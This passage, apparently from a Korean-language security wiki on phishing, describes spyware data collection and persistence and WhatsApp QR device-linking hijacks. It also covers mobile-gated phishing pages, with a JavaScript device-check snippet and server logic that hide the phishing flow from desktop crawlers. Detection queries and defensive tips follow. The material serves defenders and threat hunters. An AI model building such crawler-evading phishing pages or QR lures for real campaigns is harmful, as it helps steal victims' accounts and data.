* 수집은 로그인 이전에도 시작됩니다: **device ID**, 연락처(캐시에서 `.txt`로), 문서(이미지/PDF/Office/OpenXML)를 즉시 exfil합니다. content observer가 새 사진을 자동 업로드하고; 예약 작업이 새 문서를 매 **5 minutes**마다 재스캔합니다.
* Persistence: `BOOT_COMPLETED`를 등록하고 재부팅 및 백그라운드 강제 종료를 견디기 위해 **foreground service**를 유지합니다.

### WhatsApp device-linking hijack via QR social engineering
* 유인 페이지(예: 가짜 ministry/CERT “channel”)는 WhatsApp Web/Desktop QR을 표시하고 피해자에게 스캔하도록 지시하여 공격자를 **linked device**로 조용히 추가합니다.
* 공격자는 세션이 제거될 때까지 즉시 채팅/연락처 가시성을 얻습니다. 피해자는 나중에 “new device linked” 알림을 볼 수 있으며, 방어팀은 신뢰할 수 없는 QR 페이지 방문 직후의 예기치 않은 device-link 이벤트를 탐지할 수 있습니다.

### Mobile‑gated phishing to evade crawlers/sandboxes
운영자들은 데스크톱 크롤러가 최종 페이지에 도달하지 못하도록 간단한 디바이스 체크 뒤에 피싱 흐름을 두는 경우가 늘고 있습니다. 일반적인 패턴은 touch-capable DOM을 검사하고 결과를 서버 엔드포인트로 전송하는 작은 스크립트입니다; non‑mobile 클라이언트는 HTTP 500(또는 빈 페이지)을 받고, 모바일 사용자는 전체 흐름을 제공받습니다.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` 로직(단순화됨):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
서버에서 자주 관찰되는 동작:
- 첫 로드 시 session cookie를 설정합니다.
- `POST /detect {"is_mobile":true|false}` 를 수용합니다.
- `is_mobile=false` 일 때 이후의 GET 요청에 대해 500(또는 플레이스홀더)을 반환합니다; `true` 일 때만 phishing을 제공합니다.

헌팅 및 탐지 휴리스틱:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → 비모바일에 대해 HTTP 500; 합법적인 모바일 피해자 경로는 200과 연속되는 HTML/JS를 반환합니다.
- 콘텐츠를 오직 `ontouchstart` 또는 유사한 디바이스 체크에만 의존하는 페이지는 차단하거나 면밀히 검토하세요.

방어 팁:
- 모바일 유사 fingerprints와 JS가 활성화된 상태로 크롤러를 실행해 gated content를 노출하세요.
- 새로 등록된 도메인에서 `POST /detect` 이후에 발생하는 의심스러운 500 응답에 대해 경보를 발동하세요.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
